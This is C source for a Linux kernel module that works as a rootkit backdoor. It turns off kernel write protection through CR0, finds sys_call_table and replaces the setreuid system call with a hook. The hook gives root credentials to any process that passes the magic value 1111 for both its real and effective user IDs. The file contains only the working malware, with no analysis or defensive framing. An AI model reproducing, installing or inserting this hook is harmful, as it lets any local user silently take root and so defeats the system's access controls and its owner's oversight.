#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <linux/init.h>
#include <linux/errno.h>
#include <linux/version.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/kallsyms.h>
#include <asm/cacheflush.h>
#include <asm/page.h>

unsigned long *syscall_table;


typedef asmlinkage long (* original_setreuid_t)(old_uid_t ruid, old_uid_t euid);
original_setreuid_t original_setreuid;


asmlinkage long my_sys_setreuid(old_uid_t ruid, old_uid_t euid) {
	int result = 0;

	printk("My function");

	if ((ruid == 1111) && (euid == 1111)) {

		printk("priv esc");
		kuid_t kuid = KUIDT_INIT(0);
		kgid_t kgid = KGIDT_INIT(0);

		struct cred *new_cred = prepare_creds();
		if (new_cred == NULL) {
			printk("Failed to prepare new credentials");
			return -1;
		}

		// preparing new Root creds 
		new_cred->uid = kuid;
		new_cred->gid = kgid;
		new_cred->euid = kuid;
		new_cred->egid = kgid;

		// updating the creds of the process
		commit_creds(new_cred);

		result = original_setreuid(0, 0);
    	return result;

	}

	result = original_setreuid(ruid, euid);		
	
	return result;
}

/**
* Hooking function using changing it's address in sys_call_table
*/
void start_root_hook(void) {

	// checking and printing the index of the setreuid function
	printk("%i", __NR_setreuid); 
	
	// changing permissions to RW
	write_cr0 (read_cr0 () & (~ 0x10000));

	// getting sys_call_table address
	syscall_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");

	// storing the original setreuid address 
	original_setreuid = syscall_table[__NR_setreuid];

	// changing the address of setreuid to my reuid function
	syscall_table[__NR_setreuid] = my_sys_setreuid;	

	// changing permissions to RO
	write_cr0 (read_cr0 () | 0x10000);
}

void stop_root_hook(void) {

	// changing permissions to RW
	write_cr0 (read_cr0 () & (~ 0x10000));

	// inserting the original function pointer to the sys call table
	syscall_table[__NR_setreuid] = original_setreuid;	

	// changing permission to RO 
	write_cr0 (read_cr0 () | 0x10000);

}